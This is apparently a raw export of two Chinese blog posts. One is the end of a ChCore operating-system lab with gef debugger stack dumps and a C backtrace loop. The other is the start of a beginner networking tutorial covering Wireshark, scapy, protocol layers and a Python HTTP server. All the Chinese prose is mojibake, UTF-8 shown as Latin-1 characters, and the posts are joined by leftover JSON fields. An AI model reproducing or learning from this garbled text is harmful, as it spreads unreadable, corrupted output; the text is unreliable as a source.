è¿è¡Œï¼Œè§‚å¯Ÿæ ˆçš„å˜åŒ–ï¼Œè¿™é‡Œçœç•¥éƒ¨åˆ†è¾“å‡ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 gefâ¤ c â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€ $x0 : 0x0000000000000005 # è¿™ä¸€å±‚å‡½æ•°çš„è¾“å…¥å€¼ $x19 : 0x0000000000000000 # ä¸Šä¸€å±‚å‡½æ•°çš„è¿”å›å€¼ $x29 : 0xffffff00000920f0 # FP $x30 : 0xffffff000008c0d4 â†’ \u0026lt;main+72\u0026gt; # LR $sp : 0xffffff00000920f0 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€ 0xffffff00000920f0â”‚+0x0000: 0x0000000000000000 0xffffff00000920f8â”‚+0x0008: 0xffffff000008c018 # æ ˆå¤´ï¼Œå¯èƒ½æ˜¯æ ˆåˆå§‹åŒ–çš„æ•°æ®ç»“æ„ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€ [#0] 0xffffff000008c020 â†’ stack_test() [#1] 0xffffff000008c0d4 â†’ main() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ gefâ¤ c â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€ $x0 : 0x0000000000000004 $x19 : 0x0000000000000005 $x29 : 0xffffff00000920d0 $x30 : 0xffffff000008c070 #â†’ \u0026lt;stack_test+80\u0026gt; $sp : 0xffffff00000920d0 â†’ 0xffffff00000920f0 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€ 0xffffff00000920d0â”‚+0x0000: 0xffffff00000920f0 â”€â” # FP 0xffffff00000920d8â”‚+0x0008: 0xffffff000008c0d4 â”‚ # LR 0xffffff00000920e0â”‚+0x0010: 0x0000000000000000 â”‚ 0xffffff00000920e8â”‚+0x0018: 0x00000000ffffffc0 â”‚ 0xffffff00000920f0â”‚+0x0020: 0x0000000000000000 â—„â”˜ 0xffffff00000920f8â”‚+0x0028: 0xffffff000008c018 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€ [#0] 0xffffff000008c020 â†’ stack_test() [#1] 0xffffff000008c070 â†’ stack_test() [#2] 0xffffff000008c0d4 â†’ main() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ gefâ¤ c â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€ $x0 : 0x0000000000000003 $x19 : 0x0000000000000004 $x29 : 0xffffff00000920b0 â†’ 0xffffff00000920d0 â†’ 0xffffff00000920f0 $x30 : 0xffffff000008c070 $sp : 0xffffff00000920b0 â†’ 0xffffff00000920d0 â†’ 0xffffff00000920f0 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€ 0xffffff00000920b0â”‚+0x0000: 0xffffff00000920d0 â”€â” # [#1] 0xffffff00000920b8â”‚+0x0008: 0xffffff000008c070 â”‚ 0xffffff00000920c0â”‚+0x0010: 0x0000000000000005 â”‚ 0xffffff00000920c8â”‚+0x0018: 0x00000000ffffffc0 â”‚ 0xffffff00000920d0â”‚+0x0020: 0xffffff00000920f0 â—„â”˜ # [#2] 0xffffff00000920d8â”‚+0x0028: 0xffffff000008c0d4 â”‚ 0xffffff00000920e0â”‚+0x0010: 0x0000000000000000 â”‚ 0xffffff00000920e8â”‚+0x0018: 0x00000000ffffffc0 â”‚ 0xffffff00000920f0â”‚+0x0020: 0x0000000000000000 â—„â”˜ # [#3] 0xffffff00000920f8â”‚+0x0028: 0xffffff000008c018 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ trace â”€â”€â”€â”€ [#0] 0xffffff000008c020 â†’ stack_test() [#1] 0xffffff000008c070 â†’ stack_test() [#2] 0xffffff000008c070 â†’ stack_test() [#3] 0xffffff000008c0d4 â†’ main() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ å¯ä»¥çœ‹åˆ°æ¯æ¬¡é€’å½’è°ƒç”¨å‹æ ˆ4ä¸ª64ä½å­—ï¼Œåˆ†åˆ«æ˜¯ï¼šä¸Šä¸€å±‚FPï¼ŒLRï¼Œå‚æ•°xå’Œ0x00000000ffffffc0ã€‚æœ€åä¸€ä¸ª64ä½å­—ç”¨é€”æœªçŸ¥ã€‚\nç»ƒä¹ 9-backtrace æä¾›read_fp()æ¥å£ï¼Œæˆ‘ä»¬çŸ¥é“fpæ°¸è¿œæŒ‡å‘çˆ¶å‡½æ•°çš„fpï¼Œæ•…é€’å½’è°ƒç”¨å³å¯ã€‚\n1 2 3 4 5 u64* fp = (u64*) *((u64*)read_fp()); // åŒå±‚æŒ‡é’ˆï¼Œå› ä¸ºç¬¬ä¸€å±‚æ˜¯æœ¬å‡½æ•° while(fp != 0) { printk(\u0026#34;LR %lx FP %lx Args %d %d %d %d %d\\n\u0026#34;, *(fp + 1), fp, *(fp - 2), *(fp - 1), *(fp), *(fp + 1), *(fp + 2)); //ä¸ºä»€ä¹ˆ5ä¸ªå‚æ•°æ˜¯fp-2åˆ°fp+2ï¼Ÿæ ·ä¾‹åªåŒ…æ‹¬ä¸€ä¸ªå‚æ•°ï¼Œåªè¦å‡ºç°fp+2å°±èƒ½æµ‹è¯•é€šè¿‡ fp = (u64*) *fp; //ä¸‹ä¸€å±‚ } æ»¡åˆ†é€šè¿‡ï¼Œæ‡’å¾—è´´å›¾äº†ã€‚\nçœ‹åˆ°å¤§ä½¬å†™çš„ï¼Œç¬é—´ä¸æƒ³å†™äº†ï¼Œå¯„ã€‚ https://www.cnblogs.com/kangyupl/p/chcore_lab1.html\n","date":"2021-10-29T17:03:14Z","permalink":"https://lonelyuan.github.io/p/mospi-chcore-lab-1/","title":"MOSPI-ChCore lab (1)"},{"content":"ä¼—æ‰€å‘¨çŸ¥ï¼Œè®¡ç½‘è¢«è¯„ä¸ºæœ€å›°çš„è®¡ç®—æœºä¸“ä¸šè¯¾ï¼Œä¿—ç§°è®¡ç®—æœºä¸­çš„è¯­æ–‡ã€‚ğŸ‘´çœ‹äº†ã€Šè®¡ç®—æœºç½‘ç»œï¼è‡ªé¡¶å‘ä¸‹æ–¹æ³•ã€‹ï¼ˆåæ–‡ç®€ç§°CNTDAï¼‰ä¹‹åï¼Œè§‰å¾—ç¿»è¯‘å°±åƒæ±¤å§†å”å”çš„çƒ‚è‹¹æœæ´¾ä¸€æ ·ç³Ÿç³•ï¼Œä¸Šå¸å•Šï¼Œæˆ‘å‘èª“ä¼šç‹ ç‹ è¸¢ä»–çš„å±è‚¡ã€‚å»ºè®®å¸¦ğŸ”¥å»çœ‹è‹±æ–‡åŸç‰ˆã€‚\nä½†æ˜¯ğŸ‘´æœ€è¿‘æ¥è§¦çš„è®¸å¤šå®éªŒè¿˜æ˜¯å¾ˆå¥½ç©çš„ï¼Œäºæ˜¯æœ¬æ–‡é¢å‘å¯¹è®¡ç®—æœºç½‘ç»œå®Œå…¨0åŸºç¡€çš„åŒå­¦ï¼Œè¯•å›¾é€šè¿‡å…¨ç¨‹åŠ¨æ‰‹å®æ“å­¦ä¹ è®¡ç½‘ã€‚\nä¸»è¦å·¥å…·ï¼š\nwiresharkæ˜¯å nbçš„ç½‘ç»œå°åŒ…åˆ†æè½¯ä»¶ã€‚å°±æ˜¯ç”¨æ¥æŠ“åŒ…çš„ã€‚ ä¸‹è½½ï¼šhttps://www.wireshark.org/download.html æ•™ç¨‹ï¼šhttps://www.javatpoint.com/wireshark\nscapyåº“æ˜¯pythonçš„ç½‘ç»œç¼–ç¨‹åº“ï¼Œå¯ä»¥è®©ä½ ç»†è‡´å…¥å¾®çš„æ“çºµç½‘ç»œæµé‡ã€‚å°±æ˜¯ç”¨æ¥å‘åŒ…çš„ã€‚ //ä¸è¦å’Œçˆ¬è™«åº“scrapyæ··æ·† scapyæ–‡æ¡£ï¼šhttps://scapy.readthedocs.io/en/latest/ ä¸­æ–‡ç‰ˆï¼šhttps://www.osgeo.cn/scapy/introduction.html //æœ‰äº›ç¿»è¯‘é”™è¯¯\næœ€åæœ‰ä¸€ä¸ªæ•²ä»£ç é¡ºæ‰‹çš„pythonç¯å¢ƒå’Œä¸€ä¸ªèƒ½æ­£å¸¸ç›‘å¬çš„wiresharkå°±å¯ä»¥äº†ã€‚\nè®¡ç½‘åŸºæœ¬æ¦‚å¿µ ğŸ’£åŒ…(package) ç­‰ç­‰ï¼Œå•¥æ˜¯â€œæŠ“åŒ…â€ï¼Ÿå•¥æ˜¯â€œå‘åŒ…â€ï¼Ÿæˆ‘åªçŸ¥é“Aå¤§ä¸‹åŒ…ã€‚\nå½“ç„¶ï¼Œä¸‹åŒ…ä¸ä»…ä»…æ˜¯ä¸€ä¸ª CSGO æœ¯è¯­ï¼Œåœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼ŒåŒ…(package)æœ‰å¤šä¸ªè¿‘ä¹‰è¯ï¼ŒåŒ…æ‹¬ï¼šæŠ¥æ–‡/æ•°æ®æŠ¥(Datagram)ï¼Œåˆ†ç»„/å°åŒ…(Packet)â€¦â€¦æ ¹æ®è¯­å¢ƒä¸åŒè€ŒåŒºåˆ†ï¼Œä½†å¤§è‡´æŒ‡çš„æ˜¯åŒä¸€ä»¶äº‹æƒ…ï¼šå³ç½‘ç»œä¸­çœŸæ­£æµåŠ¨ç€çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å¸Œæœ›ç½‘ç»œæ¥ä¼ é€’çš„ä¸œè¥¿ã€‚åªä¸è¿‡â€œåŒ…â€æ˜¯æœ€é€šä¿—çš„å«æ³•ï¼Œé‚£ä¹ˆæŠ“åŒ…å’Œå‘åŒ…å°±ä¸éš¾ç†è§£äº†ã€‚\nä½ è¿˜æƒ³é—®ï¼ŒåŒ…åˆ°åº•é•¿ä»€ä¹ˆæ ·ï¼Ÿä¼—æ‰€å‘¨çŸ¥ï¼Œå¿«é€’ç”±åŒ…è£…å’Œé‡Œé¢çš„ä¸œè¥¿ç»„æˆï¼Œå…¶å®ç½‘ç»œä¸Šçš„å°åŒ…ä¹Ÿå·®ä¸å¤šï¼Œä¹Ÿå¤§è‡´éƒ½æœ‰ä¸¤éƒ¨åˆ†ï¼š\nåŒ…å¤´ï¼Œå­¦åé¦–éƒ¨(Header)â€”â€”å¿«é€’åŒ…è£…ä¸Šçš„æ ‡ç­¾ï¼Œå†™ç€ç›®çš„åœ°å€ï¼Œè”ç³»ç”µè¯ï¼Œå¿«é€’å·ç­‰ä¿¡æ¯ åŒ…ä½“ï¼Œå­¦åè½½è·(Payload)â€”â€”å¿«é€’è¦è¿è¾“çš„è´§ç‰©æœ¬èº«ã€‚æŸäº›è¯­å¢ƒä¸‹ä¹Ÿå–œæ¬¢ç§°ä¸ºæŠ¥æ–‡ã€‚ å½“ç„¶ï¼Œç½‘ç»œå°åŒ…å½’æ ¹ç»“åº•è¿˜æ˜¯çº¿æ€§çš„æ¯”ç‰¹åºåˆ—ï¼Œäºæ˜¯æˆ‘ä»¬éœ€è¦åŒ…å¤´æ¥è¯†åˆ«è¿™ä¸ªå°åŒ…çš„ç›¸å…³ä¿¡æ¯ï¼Œå°±åƒçœ‹å¿«é€’å…ˆçœ‹æ ‡ç­¾ä¸€æ ·ã€‚\nå¦å¤–ï¼Œä¸€ä¸ªåè®®çš„å°åŒ…ä¹Ÿå¯ä»¥æˆä¸ºå¦ä¸€ä¸ªåè®®çš„è½½è·ï¼Œåé¢ä½ ä¼šçœ‹åˆ°è¯¸å¦‚pkt.payload.payload.payload.payloadçš„å¥—å¨ƒç”¨æ³•ï¼Œè¦ç†è§£è¿™ç§å¥—å¨ƒï¼Œè¿˜éœ€è¦çŸ¥é“åˆ†å±‚æ€æƒ³ã€‚\nğŸ°åˆ†å±‚(layering) CNTDA ä¸­ç”¨é‚®æ”¿ç³»ç»Ÿç±»æ¯”è®¡ç®—æœºç½‘ç»œï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„ä¾‹å­ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨å¿«é€’ç‰©æµç½‘æ¥ä¸¾ä¾‹ã€‚éšä¾¿æ‰“å¼€ä½ çš„ç½‘è´­è®°å½•ï¼Œä½ ä¼šå‘ç°å¿«é€’ç‰©æµå¤§æ¦‚ç»è¿‡ä»¥ä¸‹è¿‡ç¨‹ï¼š\nå®¢æˆ·å‘è´§ï¼šæŠŠè´§ç‰©å’Œåœ°å€äº¤ç»™å¿«é€’ç‚¹ å¿«é€’ç½‘ç‚¹æ½ä»¶ï¼šåŒ…è£…è´§ç‰©è€Œå˜æˆåŒ…è£¹ï¼›åŒ…è£¹è¢«é€å¾€æœ€è¿‘çš„ä¸­è½¬ä¸­å¿ƒ ä¸­è½¬ä¸­å¿ƒè¿è¾“ï¼šæ ¹æ®åŒ…è£¹ç›®çš„åœ°ä¸åŒï¼Œåˆ†æ‹£å¹¶è£…è½¦è¿è¾“ç»™ä¸åŒçš„ä¸­è½¬ä¸­å¿ƒï¼›è‹¥æ”¶åˆ°æœ¬ç‰‡åŒºçš„åŒ…è£¹ï¼Œå¸è½¦å¹¶åˆ†æ‹£ç»™ä¸åŒçš„ç½‘ç‚¹ å¿«é€’ç½‘ç‚¹æ´¾é€ï¼šæŒ‰åŒ…è£¹çš„åœ°å€ï¼Œå¿«é€’å‘˜é€è´§ä¸Šé—¨ å®¢æˆ·å–ä»¶ï¼šæ‹†ç®±ï¼Œæ‹¿åˆ°è´§ç‰©ï¼Œç¡®è®¤æ— è¯¯ç­¾æ”¶ ä½ çŸ¥é“å‘ä¸€ä¸ªå¿«é€’è¦ç»å†æ€æ ·çš„å›°éš¾å—ï¼Ÿä½ ä¸çŸ¥é“ï¼Œä½ åªå…³å¿ƒä½ è‡ªå·±ã€‚è¿™é‡Œçš„é‡ç‚¹æ˜¯ï¼Œå®¢æˆ·ä¸éœ€è¦å…³å¿ƒä¸­è½¬ä¸­å¿ƒå¦‚ä½•æŒ‡æŒ¥é‡å‹è´§è½¦æˆ–é£æœºï¼Œç½‘ç‚¹ä¹Ÿåªéœ€è¦å…³å¿ƒå¦‚ä½•åŒ…è£…å¥½å®¢æˆ·çš„è´§ç‰©ã€‚å¿«é€’ç½‘ç»œæ˜æ˜¾çš„å‘ˆç°å‡ºä¸‰å±‚çš„åˆ†å±‚æ¶æ„ï¼Œæ¯ä¸€å±‚ä¹‹é—´åªéœ€è¦å…³å¿ƒè‡ªå·±çš„å·¥ä½œï¼Œå¹¶å’Œç›¸é‚»çš„å±‚äº¤äº’ã€‚è¿™å°±æ˜¯åº”å¯¹å¤æ‚ç³»ç»Ÿçš„ç»„ç»‡æ–¹æ³•â€”â€”åˆ†å±‚ã€‚\nè¯¾æœ¬ä¸Šä¼šæåˆ°OSIä¸ƒå±‚æ¨¡å‹æˆ–è€…TCP/IPäº”å±‚æ¨¡å‹ï¼Œè¿™é‡Œçš„æ¨¡å‹å…¨ç§°æ˜¯åè®®åˆ†å±‚æ¨¡å‹ï¼Œåˆæ¥æ–°è¯äº†ï¼Œåˆ«æ€¥ï¼Œåé¢è¿˜æœ‰ï¼š\nåè®®(Protocol)ï¼šåŒä¸€å±‚çº§å†…çš„äº¤äº’è§„åˆ™ã€‚//æ¨ªå‘ æœåŠ¡(Service)ï¼šä¸åŒå±‚çº§é—´çš„äº¤äº’è§„åˆ™ã€‚//çºµå‘ æ¯ä¸€å±‚çš„å·¥ä½œï¼Œå°±æ˜¯è°ƒç”¨ä¸‹å±‚çš„æ¥å£ï¼Œå¹¶ä¸ºä¸Šå±‚æä¾›æœåŠ¡ã€‚æ¥å£(Interface)å’ŒæœåŠ¡çš„åŒºåˆ«æ˜¯ï¼ŒæœåŠ¡ä½œä¸ºå®ä½“ï¼Œç”±æœ¬å±‚è´Ÿè´£å®ç°ï¼Œæš´éœ²å‡ºæ¥å£ä¾›ä¸Šå±‚è°ƒç”¨ï¼›è€Œæ¥å£åˆ™æ˜¯æŠ½è±¡çš„ï¼Œæœ¬å±‚å¹¶ä¸çŸ¥é“ä¸‹ä¸€å±‚çš„å¯é æ€§ã€‚\nç”±æ­¤ä½ èƒ½å¦çœ‹å‡ºåˆ†å±‚æ€æƒ³çš„ä¼˜è¶Šæ€§ï¼Ÿæ¯ä¸€å±‚åªå…³æ³¨è‡ªå·±çš„å®ç°ï¼Œäºæ˜¯å¤§é—®é¢˜è¢«åˆ†è§£æˆäº†å°é—®é¢˜ã€‚å¥½æ¯”ä¸€ä¸ªæ€»å·¥ä½œé‡100çš„é—®é¢˜ï¼Œä¸äº†è§£åˆ†å±‚æ€æƒ³çš„ä½ åªèƒ½10+10+10+â€¦â€¦=100ï¼›è€Œåˆ†å±‚æ€æƒ³æä¾›äº†ä¹˜æ³•æ³•åˆ™ï¼Œäºæ˜¯ä½ å¯ä»¥é€šè¿‡10*10=100ï¼Œåªéœ€è¦å®Œæˆ20å·¥ä½œé‡ã€‚//ä¸ªä¸­æ€æƒ³ä¹Ÿä½“ç°äº†OOPä¸­çš„è§£è€¦ã€‚\nä¸Šè¿°ç±»æ¯”ä¸­æ ‡æ³¨äº†ä¸€äº›å¯¹åº”å…³ç³»ï¼š\nå°åŒ…(Packaging)ï¼šåŒ…è£…ï¼Œè´§ç‰©â†’åŒ…è£¹ã€‚ä¿¡æ¯åœ¨å±‚æ¬¡é—´ä¼ é€’çš„è¿‡ç¨‹å°±æ˜¯å°åŒ…/è§£å°çš„è¿‡ç¨‹ã€‚ è·¯ç”±(Routing)ï¼šåˆ†æ‹£ã€‚æ ¹æ®åŒ…è£¹ä¸Šçš„æ ‡ç­¾ï¼Œå†³å®šåŒ…è£…çš„å»å‘ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸€å±‚éƒ½æœ‰è‡ªå·±çš„â€œè´§ç‰©â€ï¼Œæ¯”å¦‚ä¸­è½¬ä¸­å¿ƒçš„è½½è·æ˜¯æ»¡è½½åŒ…è£¹çš„é•¿é€”è´§è½¦è€Œä¸æ˜¯å•ä¸ªåŒ…è£¹ã€‚æŠ¥æ–‡åœ¨æ¯ä¸€å±‚éƒ½è¢«å°è£…å¹¶äº¤ç»™ä¸‹ä¸€å±‚ï¼Œè¦æƒ³å¾—åˆ°åŸå§‹æŠ¥æ–‡åªèƒ½ä¸€å±‚ä¸€å±‚è§£å¼€ï¼Œæ“ä½œæ¨¡å¼ç±»ä¼¼æ ˆã€‚ç”±æ­¤åè®®åˆ†å±‚æ¨¡å‹ä¹Ÿè¢«ç®€ç§°ä¸ºåè®®æ ˆ(Protocol stack)ã€‚\næœ€åç®€å•è§£é‡Šäº”å±‚æ¨¡å‹æ¯ä¸€å±‚çš„åˆ†å·¥ï¼Œè‡ªåº•å‘ä¸Šé¡ºåºï¼š\nç‰©ç†å±‚ï¼šå¯¹æ¥ç‰©ç†ä»‹è´¨ï¼Œè¿è¾“æ¯”ç‰¹ æä¾›åŸºäºæ¯”ç‰¹çš„é€šä¿¡è·¯å¾„ é“¾è·¯å±‚ï¼šå°†è·¯å¾„ä¸²è”æˆé“¾ æä¾›åŸºäºé“¾è·¯çš„æ¥å…¥ã€äº¤ä»˜ã€å’Œä¼ è¾“æœåŠ¡ ç½‘ç»œå±‚ï¼šå°†é“¾è·¯ç¼–ç»‡æˆç½‘ æä¾›ä»»æ„ä¸¤ä¸»æœºä¹‹é—´çš„é€šä¿¡ è¿è¾“å±‚ï¼šå°†ä¸»æœºçš„é€šä¿¡åˆ†è§£ä¸ºè¿›ç¨‹çš„é€šä¿¡ æä¾›è¿›ç¨‹é—´çš„é€»è¾‘é€šä¿¡ åº”ç”¨å±‚ï¼šå®ç°ç”¨æˆ·éœ€æ±‚ å‘ç”¨æˆ·æä¾›é€æ˜å¯é çš„ç½‘ç»œæœåŠ¡ å¶å‰‹ï¼ä½ å·²ç»äº†è§£äº†åˆ†å±‚æ€æƒ³ï¼Œä¸‹é¢æ¥è®¾è®¡äº’è”ç½‘å§ï¼\nâŒšï¸å¼€å§‹å®éªŒ æœ‰å…³è®¡ç½‘çš„å­¦ä¹ é¡ºåºè‡ªå¤å°±æœ‰è‡ªé¡¶å‘ä¸‹è¿˜æ˜¯è‡ªåº•å‘ä¸Šçš„åˆ†æ­§ï¼Œä½™ä»¥ä¸ºåªè¦ç†è§£äº†åˆ†å±‚æ€æƒ³ï¼Œé¡ºåºä¾¿ä¸ç®—å¾ˆé‡è¦ã€‚æœ¬ç³»åˆ—å®éªŒå°†éµä»æµ…å…¥æ·±å‡ºçš„åŸåˆ™ï¼Œä»åº”ç”¨å±‚é€æ­¥æ·±å…¥åˆ°é“¾è·¯å±‚å†è¿”å›åº”ç”¨å±‚ï¼ŒåŒæ—¶éš¾åº¦ä¸æ–­åŠ å¤§ã€‚\nå®éªŒæ¥æºï¼š\nğŸ‘´è‡ªå·±ï¼š0x10, 0x20 SEEDLabï¼Œé›ªåŸå¤§å­¦çš„ä¿¡æ¯å®‰å…¨è¯¾é…å¥—å®éªŒï¼Œç½‘ç»œå®‰å…¨éƒ¨åˆ†ã€‚å›½å†…çŸ¥ååº¦ä¸é«˜æ‰€ä»¥å€¼å¾—ä¸€åšã€‚å®˜æ–¹ç½‘ç«™ CNTDA å®éªŒï¼šGIthubä¸ŠæŠ„çš„ä½œä¸š å®éªŒä»£ç ä»“åº“ï¼šlonelyuan/ComputerNetwork-exp (github.com)\nå®éªŒç¼–å·è§„åˆ™ï¼š0xabn\naï¼šå±‚çº§ï¼š1 - åº”ç”¨å±‚ï¼›2 - ä¼ è¾“å±‚ï¼›3 - ç½‘ç»œå±‚ï¼›4 - é“¾è·¯å±‚ï¼›5 - ç‰©ç†å±‚ bï¼šéš¾åº¦ï¼š0 - â­ï¼›1 - â­â­ï¼›2 - â­â­â­ï¼›3 - â­â­â­â­ï¼›4 - â­â­â­â­â­ï¼› nï¼šé‡å¤éš¾åº¦åˆ™å†åŠ ä¸€ä½ç¼–å· //ã€æƒ³çœ‹å“ªä¸ªæ²¡æ›´æ–°çš„å¯ä»¥å‚¬ğŸ‘´ã€‘\n0x10 åº”ç”¨å±‚: Server | â­ ç›®æ ‡ï¼šç”¨scapy/socketåšä¸€ä¸ªé™æ€æœåŠ¡å™¨ã€‚\nå®é™…ä¸Šï¼Œpython3å·²ç»è‡ªå¸¦äº†ä¸€ä¸ªç®€æ˜“httpæœåŠ¡å™¨ï¼š 1 2 3 $ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 127.0.0.1 - - [10/Nov/2021 14:51:57] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - æ­¤æ—¶æµè§ˆå™¨è®¿é—®ï¼šlocalhost:8000ï¼Œå¦‚æœå½“å‰ç›®å½•ä¸‹æœ‰index.htmlæ–‡ä»¶ï¼Œæµè§ˆå™¨å³å¯æ˜¾ç¤ºè¯¥htmlæ–‡æ¡£ã€‚è¿™æ¡å‘½ä»¤è¡¨æ˜ï¼Œè°ƒç”¨pythonæ ‡å‡†åº“httpçš„serveræ–¹æ³•ï¼Œé»˜è®¤ä¼šåœ¨8000ç«¯å£å¯åŠ¨ä¸€ä¸ªhttpæœåŠ¡å™¨ã€‚è¯¥æœåŠ¡å™¨ä¹Ÿæ˜¯åŸºäºå¦ä¸€ä¸ªpythonæ ‡å‡†åº“socketç¼–å†™çš„ï¼Œæœ¬å®éªŒçš„ç›®æ ‡å³æ˜¯è‡ªå·±å®ç°ç±»ä¼¼çš„åŠŸèƒ½ã€‚\nä½†é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ä¸€äº›å‰ç½®çŸ¥è¯†ï¼š\nC/Sæ¶æ„(client-server)ï¼šäº’è”ç½‘çš„åŸºæœ¬æ¨¡å‹ã€‚é€šä¿¡çš„åŒæ–¹é€šå¸¸åˆ†æˆä¸¤ä¸ªè§’è‰²ï¼š\nå‘èµ·çš„ä¸€æ–¹ç§°ä¸ºå®¢æˆ·ç«¯(C)ï¼Œå³å‰ç«¯ã€‚ æ¥æ”¶çš„ä¸€æ–¹ç§°ä¸ºæœåŠ¡ç«¯(S)ï¼Œå³åç«¯ã€‚ä¸ºäº†ä¿è¯éšæ—¶æ¥æ”¶è¯·æ±‚ï¼ŒæœåŠ¡ç«¯éœ€è¦æŒä¹…ç›‘å¬æŸé€šä¿¡ç«¯å£ URL(ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦)ï¼šä¿—ç§°çš„ç½‘å€ï¼Œä¹Ÿå°±æ˜¯äº’è”ç½‘ä¸Šçš„åœ°å€ã€‚\nå®Œæ•´è¯­æ³•ï¼š[åè®®å]://[ç”¨æˆ·å]:[å¯†ç ]@[æœåŠ¡å™¨åœ°å€]:[æœåŠ¡å™¨ç«¯å£å·]/[è·¯å¾„]?[æŸ¥è¯¢å­—ç¬¦ä¸²]#[ç‰‡æ®µ] HTTPåè®®ï¼šåº”ç”¨å±‚æœ€æ™®éçš„æ–‡æœ¬åè®®ä¹‹ä¸€ã€‚æ–‡æœ¬åè®®è¡¨ç¤ºå…¶æ‰€æœ‰å†…å®¹éƒ½æ˜¯å¯è¯»çš„ï¼Œå…¶ä¸»è¦æ ¼å¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 GET / HTTP/1.1\\r\\n /* ä¸€ä¸ªçŠ¶æ€è¡Œ */ Host: localhost\\r\\n /* å¤šä¸ªé¦–éƒ¨è¡Œ */ ... Connection: close\\r\\n\\r\\n /* ä»¥ä¸¤ä¸ªCRLF(å›è½¦æ¢è¡Œï¼Œç¼–ç¨‹æ—¶ç”¨\\r\\nè¡¨ç¤º)éš”æ–­ */ \u0026lt;html\u0026gt;... \u0026lt;/html\u0026gt; /* payload */ HTMLï¼šæ ‡è®°è¯­è¨€ï¼Œç”¨\u0026lt;\u0026gt;ç»„ç»‡èµ·ç½‘é¡µçš„éª¨æ¶ã€‚æµè§ˆå™¨ä¼šæŠŠHTMLæºç æ¸²æŸ“æˆå¥½çœ‹çš„ç½‘é¡µã€‚ socketï¼šé€»è¾‘é€šä¿¡çš„ç«¯ç‚¹ã€‚ socketæ˜¯é€»è¾‘é€šä¿¡çš„æ¥å£ã€‚ä¸Šæ–‡æåˆ°ç½‘ç»œå±‚ä¸ºè¿è¾“å±‚å’Œåº”ç”¨å±‚æä¾›äº†ç‚¹åˆ°ç‚¹çš„é€»è¾‘é€šä¿¡æœåŠ¡ï¼Œè¯¥æœåŠ¡çš„åŸºæœ¬æ¥å£å°±æ˜¯socketã€‚ socketæ˜¯é€šä¿¡ç«¯ç‚¹çš„æŠ½è±¡ã€‚å®ƒå°†è¿›ç¨‹/åº”ç”¨å’Œ(ä¸»æœºhost,ç«¯å£port) äºŒå…ƒç»„ç»‘å®šï¼Œäºæ˜¯é€šè¿‡ (host,port) å³å¯æ ‡è®°ç½‘ç»œä¸Šçš„è¿›ç¨‹ã€‚ 